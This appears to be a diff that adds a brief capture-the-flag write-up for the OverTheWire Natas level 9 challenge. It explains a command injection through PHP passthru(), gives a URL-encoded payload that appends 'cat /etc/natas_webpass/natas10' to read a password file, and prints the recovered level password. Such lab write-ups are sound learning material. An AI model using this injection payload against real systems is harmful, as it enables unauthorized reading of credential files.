@@ -1,0 +1,7 @@
+PHP script takes "$key" from form and passes it into passthru() which executes a full-on command in a shell. 
+Adversary controls $key and can terminate the hard-coded "grep" using a semicolon.  It can then execute
+a "cat /etc/natas_webpass/natas10 ; " to dump out the password.
+
+http://natas9.natas.labs.overthewire.org/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10%3B&submit=Search
+
+Password for natas10 is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
